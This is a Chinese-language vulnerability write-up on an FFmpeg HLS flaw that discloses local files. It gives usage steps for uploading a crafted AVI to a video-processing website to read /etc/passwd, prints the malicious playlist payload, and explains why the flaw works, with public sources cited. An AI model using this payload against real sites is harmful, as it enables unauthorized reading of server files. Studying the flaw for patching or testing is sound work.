# FFmpeg HLS 漏洞
FFmpeg是一个用于处理音频和视频格式的开源软件。您可以在AVI视频中使用恶意HLS播放列表来读取任意文件。

## Exploits
```
1. ./gen_xbin_avi.py file://你要读取的文件名，如file:///etc/passwd file_read.avi
2. 将`file_read.avi`上传到存在视频处理功能的网站系统上
3. 上传成功后，在视频服务中单击“播放”。
4. 如果系统存在漏洞，你会从服务器上得到file:///etc/passwd的内容。
```

## 它的工作原理 (来源：neex - Hackerone)
利用该脚本创建一个AVI，该AVI在GAB2中包含一个HLS播放列表。此脚本生成的播放列表如下所示：
```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:1.0
GOD.txt
#EXTINF:1.0
/etc/passwd
#EXT-X-ENDLIST
```
为了处理播放列表，ffmpeg将所有段连接起来，并将其作为单个文件进行处理。
为了确定该文件的类型，FFmpeg使用播放列表的第一段。
FFmpeg以一种特殊的方式处理.txt文件。它试图显示打印此文件的tty的屏幕截图。

因此，上面的播放列表将按如下方式处理：
FFmpeg在GAB2块中看到#EXTM3U签名，并确定文件类型为HLS播放列表。
文件GOD.txt甚至不存在，但它的名称足以让FFmpeg将文件类型检测为.txt。
FFmpeg连接播放列表的所有段的内容。因为实际上只存在两个段中的一个，所以串联的结果就是我们想要检索的文件的内容。
因为这个连接的类型是.txt，所以FFmpeg绘制一个打印文件的tty。

## 致谢
* [Hackerone - Local File Disclosure via ffmpeg @sxcurity](https://hackerone.com/reports/242831)
* [Hackerone - Another local file disclosure via ffmpeg](https://hackerone.com/reports/243470)
* [PHDays - Attacks on video converters:a year later, Emil Lerner, Pavel Cheremushkin](https://docs.google.com/presentation/d/1yqWy_aE3dQNXAhW8kxMxRqtP7qMHaIfMzUDpEqFneos/edit#slide=id.p)
* [利用程序 @neex](https://github.com/neex/ffmpeg-avi-m3u-xbin/blob/master/gen_xbin_avi.py)